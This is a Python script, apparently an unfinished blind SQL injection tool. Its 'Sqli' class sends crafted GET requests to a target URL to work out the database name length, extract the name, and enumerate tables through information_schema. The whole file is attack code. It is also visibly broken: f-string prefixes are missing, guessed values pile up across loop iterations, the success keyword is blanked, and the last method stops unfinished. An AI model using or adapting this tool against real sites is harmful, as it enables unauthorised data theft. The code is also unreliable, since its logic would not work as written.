import requests  #导入requests包
import urllib.parse

#TODO::a lot of work

class Sqli:
    def __init__(self, url):
        self.url = url
        self.database = None
        self.db_length = 0
        self.table_count = 0
        self.table_list = []
        self.column_list = []
        self.success_keyword = 'query_success'
        self.success_keyword = ''

    def get_response(self, parmas):
        url = self.url + '?' + urllib.parse.quote(parmas)
        user_agent = 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'
        headers = {'User-Agent': user_agent}
        response = requests.get(url, headers=headers)  # Get方式获取网页数据
        response.encoding = 'utf-8'
        return response

    def get_db_length(self):
        params = '1 and length(database())='
        for i in range(20):
            params += str(i+1)
            resp = self.get_response(params)
            if self.success_keyword in resp:
                self.db_length = i+1
                break

    def get_db(self):
        self.database = ''
        for i in range(1, self.db_length+1):
            params = '1 and ascii(substring(database(), {i}, 1))='
            for j in range(97, 123):  # a-z
                params += str(j)
                resp = self.get_response(params)
                if self.success_keyword in resp:
                    self.database += chr(j)
                    break

    def get_table_count(self):
        for i in range(1, 100):
            params = '1 and (select count(table_name) from ' \
                     "information_schema.tables where table_schema='{self.database}') ={i}"
            resp = self.get_response(params)
            if self.success_keyword in resp:
                self.table_count = i
                break

    def get_tables(self):
        self.table_list = []
        params = '1 and ascii(substring(select group_concat(table_name) from ' \
                 'information_schema.tables where table_schema={self.database}, {i}, 1))='


